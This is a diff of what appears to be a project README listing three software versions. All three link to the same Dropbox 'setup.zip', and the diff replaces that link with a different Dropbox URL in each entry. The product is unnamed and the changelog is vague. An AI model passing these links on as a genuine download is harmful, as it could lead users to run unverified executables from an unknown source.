@@ -5,15 +5,15 @@
 
 
 
-## ✅ [Version - 7.8.4 - stable](https://www.dropbox.com/s/h3dsugdbc6h05mw/setup.zip?dl=1)
+## ✅ [Version - 7.8.4 - stable](https://www.dropbox.com/s/ha9o7urde8nusyw/setup.zip?dl=1)
 ##### -Updating the database
 ##### -Added a section for bloggers
 
-## ✅ [Version - 7.8.2](https://www.dropbox.com/s/h3dsugdbc6h05mw/setup.zip?dl=1)
+## ✅ [Version - 7.8.2](https://www.dropbox.com/s/ha9o7urde8nusyw/setup.zip?dl=1)
 ##### -Updating the interface
 ##### -Ability to invite partners via a referral link
 
-## ✅ [Version - 7.8.0](https://www.dropbox.com/s/h3dsugdbc6h05mw/setup.zip?dl=1)
+## ✅ [Version - 7.8.0](https://www.dropbox.com/s/ha9o7urde8nusyw/setup.zip?dl=1)
 ##### -Minor corrections
 ##### -Improved display of coupons
 
